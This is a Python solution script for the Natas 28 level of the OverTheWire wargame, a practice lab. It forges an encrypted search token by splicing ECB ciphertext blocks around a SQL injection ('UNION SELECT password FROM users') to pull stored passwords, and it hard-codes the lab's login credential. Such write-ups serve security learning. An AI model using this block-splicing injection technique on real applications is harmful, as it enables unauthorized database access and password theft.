import base64
import requests as req
import string
from math import ceil

sess = req.Session()
size = 16
username = "natas28"
passwd = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
url = "http://natas28.natas.labs.overthewire.org/"
auth = req.auth.HTTPBasicAuth(username, passwd)

SQLi = 'a'*9 + "' UNION SELECT password FROM users;#"

num_blocks = (len(SQLi) - 10) / size
if (len(SQLi) - 10) % size != 0:
    num_blocks = ceil(num_blocks)

res = sess.post(url=url, auth=auth, data={'query': SQLi})
raw_payload = base64.b64decode(req.utils.unquote(res.url[60:]))
res = sess.post(url=url, auth=auth, data={'query': 'a'*10})
orig = base64.b64decode(req.utils.unquote(res.url[60:]))

payload = orig[:size*3] + raw_payload[size*3:size*3 + (num_blocks*size)] + orig[size*3:]
enc_payload = req.utils.quote(base64.b64encode(payload))
res = sess.get(url=(url + "search.php/?query=%s" % enc_payload), auth=auth)
print(res.text)
